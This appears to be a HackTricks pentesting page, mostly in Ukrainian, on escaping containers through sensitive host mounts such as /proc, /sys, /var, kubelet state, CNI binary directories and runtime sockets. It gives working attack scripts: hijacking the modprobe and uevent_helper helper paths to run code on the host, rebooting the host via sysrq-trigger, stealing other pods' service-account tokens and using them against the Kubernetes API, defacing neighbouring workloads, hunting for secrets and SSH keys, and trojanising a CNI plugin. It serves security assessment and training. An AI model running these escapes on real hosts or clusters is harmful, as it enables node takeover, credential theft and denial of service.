# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts є одними з найважливіших практичних поверхонь container-escape, тому що вони часто зводять ретельно ізольований процесний view назад до прямої видимості host resources. Небезпечні випадки не обмежуються `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state або device-related paths можуть expose kernel controls, credentials, neighboring container filesystems і runtime management interfaces.

Ця сторінка існує окремо від індивідуальних сторінок protection, тому що abuse model є cross-cutting. Writable host mount небезпечний частково через mount namespaces, частково через user namespaces, частково через AppArmor або SELinux coverage, і частково через те, який саме host path був exposed. Розглядати це як окрему тему робить attack surface набагато легшим для reasoning.

## `/proc` Exposure

procfs містить і звичайну process information, і high-impact kernel control interfaces. Тому bind mount на кшталт `-v /proc:/host/proc` або container view, яка expose неочікувані writable proc entries, може призвести до information disclosure, denial of service або direct host code execution.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Start by checking which high-value procfs entries are visible or writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ці paths цікаві з різних причин. `core_pattern`, `modprobe` і `binfmt_misc` можуть стати host code-execution paths, якщо доступні на запис. `kallsyms`, `kmsg`, `kcore` і `config.gz` — потужні джерела reconnaissance для kernel exploitation. `sched_debug` і `mountinfo` показують контекст process, cgroup і filesystem, що може допомогти відтворити layout host зсередини container.

Практична цінність кожного path різна, і поводитися з ними так, ніби вони мають однаковий impact, ускладнює triage:

- `/proc/sys/kernel/core_pattern`
Якщо доступний на запис, це один із найвпливовіших procfs paths, тому що kernel виконає pipe handler після crash. Container, який може вказати `core_pattern` на payload, що зберігається в його overlay або в mounted host path, часто може отримати host code execution. Див. також [read-only-paths.md](protections/read-only-paths.md) для окремого прикладу.
- `/proc/sys/kernel/modprobe`
Цей path керує userspace helper, який kernel використовує, коли йому потрібно викликати module-loading logic. Якщо його можна записувати з container і він інтерпретується в host context, він може стати ще однією host code-execution primitive. Особливо цікавий у поєднанні зі способом викликати helper path.
- `/proc/sys/vm/panic_on_oom`
Зазвичай це не clean escape primitive, але він може перетворити memory pressure на host-wide denial of service, переводячи OOM conditions у kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
Якщо interface реєстрації доступний на запис, attacker може зареєструвати handler для вибраного magic value і отримати execution у host-context, коли буде виконано відповідний file.
- `/proc/config.gz`
Корисний для kernel exploit triage. Допомагає визначити, які subsystems, mitigations і optional kernel features увімкнено, без потреби в host package metadata.
- `/proc/sysrq-trigger`
Переважно denial-of-service path, але дуже серйозний. Він може негайно reboot, panic або іншим чином порушити роботу host.
- `/proc/kmsg`
Показує kernel ring buffer messages. Корисний для host fingerprinting, crash analysis і в деяких середовищах для leak інформації, корисної для kernel exploitation.
- `/proc/kallsyms`
Цінний, коли доступний для читання, тому що показує exported kernel symbol information і може допомогти обійти припущення про address randomization під час kernel exploit development.
- `/proc/[pid]/mem`
Це прямий process-memory interface. Якщо цільовий process доступний із потрібними ptrace-style умовами, він може дозволити читання або зміну memory іншого process. Реальний impact сильно залежить від credentials, `hidepid`, Yama і ptrace restrictions, тож це потужний, але умовний path.
- `/proc/kcore`
Показує core-image-style view системної memory. File величезний і незручний у використанні, але якщо його можна змістовно читати, це означає погано захищену host memory surface.
- `/proc/kmem` and `/proc/mem`
Історично high-impact raw memory interfaces. На багатьох modern systems вони вимкнені або сильно обмежені, але якщо присутні й придатні до використання, їх слід вважати критичними findings.
- `/proc/sched_debug`
Leak-ить scheduling і task information, що може розкривати host process identities навіть тоді, коли інші process views виглядають чистішими, ніж очікувалося.
- `/proc/[pid]/mountinfo`
Надзвичайно корисний для відновлення того, де container насправді знаходиться на host, які paths використовують overlay-backed storage і чи відповідає writable mount host content чи лише container layer.

Якщо `/proc/[pid]/mountinfo` або overlay details доступні для читання, використайте їх, щоб відновити host path container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, тому що низка host-execution trick потребує перетворення шляху всередині container у відповідний шлях з точки зору host.

### Full Example: `modprobe` Helper Path Abuse

Якщо `/proc/sys/kernel/modprobe` writable з container і helper path інтерпретується в контексті host, його можна перенаправити на payload під контролем attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки kernel, але важливий момент у тому, що writable helper path може перенаправити майбутній виклик kernel helper на content з host-path, контрольований attacker.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Якщо мета — assessment експлуатованості, а не негайний escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають відповісти, чи видно корисну інформацію про symbols, чи recent kernel messages розкривають цікакий стан, і які kernel features або mitigations скомпільовані. Вплив зазвичай не є прямим escape, але це може різко скоротити triage kernel-vulnerability.

### Full Example: SysRq Host Reboot

Якщо `/proc/sysrq-trigger` доступний для запису і досягає host view:
```bash
echo b > /proc/sysrq-trigger
```
Наслідок — негайне перезавантаження host. Це не тонкий приклад, але він чітко демонструє, що exposure `procfs` може бути набагато серйознішим за information disclosure.

## `/sys` Exposure

`sysfs` exposes великі обсяги стану kernel і device. Деякі шляхи `sysfs` переважно корисні для fingerprinting, тоді як інші можуть впливати на виконання helper, поведінку device, конфігурацію security-module або стан firmware.

High-value шляхи `sysfs` включають:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку thermal-management і, відповідно, на стабільність host у погано ізольованих середовищах. `/sys/kernel/vmcoreinfo` може leak-нути crash-dump і kernel-layout інформацію, що допомагає low-level fingerprinting host. `/sys/kernel/security` — це інтерфейс `securityfs`, який використовується Linux Security Modules, тому неочікуваний доступ там може expose або змінити MAC-related стан. Шляхи EFI variables можуть впливати на firmware-backed boot settings, роблячи їх набагато серйознішими за звичайні configuration files. `debugfs` під `/sys/kernel/debug` особливо небезпечний, тому що це навмисно developer-oriented інтерфейс із набагато меншими очікуваннями щодо безпеки, ніж hardened production-facing kernel APIs.

Корисні команди для перевірки цих шляхів:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Що робить ці команди цікавими:

- `/sys/kernel/security` може показати, чи AppArmor, SELinux або інший LSM surface видимий у спосіб, який мав би залишатися лише на host.
- `/sys/kernel/debug` часто є найтривожнішою знахідкою в цій групі. Якщо `debugfs` змонтовано і його можна читати або записувати, очікуйте широкий kernel-facing surface, чий точний ризик залежить від увімкнених debug nodes.
- EFI variable exposure трапляється рідше, але якщо вона присутня, це має високий impact, бо стосується налаштувань, підкріплених firmware, а не звичайних runtime files.
- `/sys/class/thermal` головним чином важливий для host stability і hardware interaction, а не для акуратного shell-style escape.
- `/sys/kernel/vmcoreinfo` головним чином є джерелом host-fingerprinting і crash-analysis, корисним для розуміння low-level kernel state.

### Full Example: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` можна записувати, kernel може виконати helper під контролем attacker, коли спрацьовує `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Причина, чому це працює, полягає в тому, що шлях до helper інтерпретується з точки зору host. Після запуску helper виконується в контексті host, а не всередині поточного container.

## `/var` Exposure

Mounting host's `/var` у container часто недооцінюють, бо це не виглядає так драматично, як mounting `/`. На практиці цього може бути достатньо, щоб дістатися runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens і neighboring application filesystems. На modern nodes, `/var` часто є місцем, де фактично живе найцікавіший з operational point of view container state.

### Kubernetes Example

Pod з `hostPath: /var` часто може читати projected tokens інших pod'ів і overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, тому що вони дають відповідь, чи відкриває цей mount лише нецікаві дані застосунку, чи високоризикові облікові дані кластера. Доступний для читання service-account token може негайно перетворити local code execution на доступ до Kubernetes API.

Якщо token присутній, перевірте, до чого він може дістатися, замість того щоб зупинятися на виявленні token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Тут вплив може бути набагато більшим, ніж локальний доступ до node. Token із широким RBAC може перетворити змонтований `/var` на compromise всього cluster.

### Docker And containerd Example

На Docker hosts відповідні дані часто знаходяться в `/var/lib/docker`, тоді як на Kubernetes nodes, що працюють на containerd, вони можуть бути в `/var/lib/containerd` або в paths, специфічних для snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` розкриває доступні для запису snapshot-дані іншого workload, атакувальник може змінювати файли застосунку, розміщувати web content або змінювати startup scripts без втручання в поточну container configuration.

Конкретні ідеї зловживання після виявлення writable snapshot content:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ці команди корисні, тому що вони показують три основні сім’ї впливу змонтованого `/var`: втручання в application, відновлення secret і lateral movement у сусідні workloads.

## Kubelet State, Plugins, And CNI Paths

Mount of `/var/lib/kubelet`, `/opt/cni/bin`, або `/etc/cni/net.d` often exposed through privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, and storage helpers. These mounts are easy to dismiss as "node plumbing", but they sit directly in the execution path for new pods and often contain kubelet credentials, projected secrets, registration sockets, and executable host-side plugin binaries.

High-value targets include:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Чому ці шляхи важливі:

- `/var/lib/kubelet/pki` може розкривати kubelet client certificates та інші node-local credentials, які інколи можна повторно використати проти API server або kubelet-facing TLS endpoints, залежно від дизайну кластера.
- `/var/lib/kubelet/pods` часто містить projected service-account tokens і mounted Secrets для сусідніх pod’ів на тому самому node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` — це переважно reconnaissance surface, але дуже корисна: він показує, які pod’и та container’и зараз використовують GPUs, hugepages, SR-IOV devices та інші scarce node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, і `/var/lib/kubelet/plugins_registry` показують, які CSI, DRA, і device plugins встановлені та з якими sockets kubelet очікує взаємодіяти. Якщо ці каталоги writable, а не лише readable, finding стає значно серйознішим.
- `/opt/cni/bin` і `/etc/cni/net.d` знаходяться прямо на шляху pod-network setup. Writable access там часто є delayed host-execution primitive, а не просто exposure конфігурації.

### Full Example: Writable `/opt/cni/bin`

Якщо host CNI binary directory змонтований read-write, заміна plugin може бути достатньою, щоб отримати host execution під час наступного створення kubelet pod sandbox на цьому node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Це не так негайно, як змонтований `docker.sock`, але це часто більш реалістично в скомпрометованих pods інфраструктури Kubernetes. Важливий момент у тому, що змінений binary пізніше виконується flow налаштування host network, а не поточним container.


## Runtime Sockets

Sensitive host mounts часто включають runtime sockets замість повних directories. Вони настільки важливі, що заслуговують на окреме повторення тут:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Див. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) для повних сценаріїв експлуатації, коли один із цих сокетів змонтовано.

Як швидкий шаблон першої взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із цих способів спрацьовує, шлях від "mounted socket" до "start a more privileged sibling container" зазвичай значно коротший, ніж будь-який kernel breakout path.

## Mount-Related CVEs

Host mounts також перетинаються з runtime vulnerabilities. Важливі недавні приклади включають:

- `CVE-2024-21626` у `runc`, де leaked directory file descriptor міг розмістити working directory на host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652` і `CVE-2024-23653` у BuildKit, де malicious Dockerfiles, frontends і `RUN --mount` flows могли знову відкрити host file access, deletion або elevated privileges під час builds.
- `CVE-2024-1753` у Buildah і Podman build flows, де crafted bind mounts під час build могли expose `/` read-write.
- `CVE-2025-47290` у `containerd` 2.1.0, де TOCTOU під час image unpack міг дозволити specially crafted image змінювати host filesystem під час pull.

Ці CVEs важливі тут, тому що вони показують: обробка mounts — це не лише питання operator configuration. Сам runtime також може introduсe mount-driven escape conditions.

## Checks

Use these commands to locate the highest-value mount exposures quickly:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Що тут цікаво:

- Host root, `/proc`, `/sys`, `/var` і runtime sockets — це все знахідки з високим пріоритетом.
- Записувані записи proc/sys часто означають, що mount відкриває host-global kernel controls, а не безпечне container view.
- Змонтовані шляхи `/var` заслуговують на review credentials і сусідніх workloads, а не лише filesystem review.
- Каталоги стану kubelet і шляхи CNI/plugin заслуговують на такий самий пріоритет, як runtime sockets, бо вони часто лежать прямо на шляху node's pod-creation і credential-distribution.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
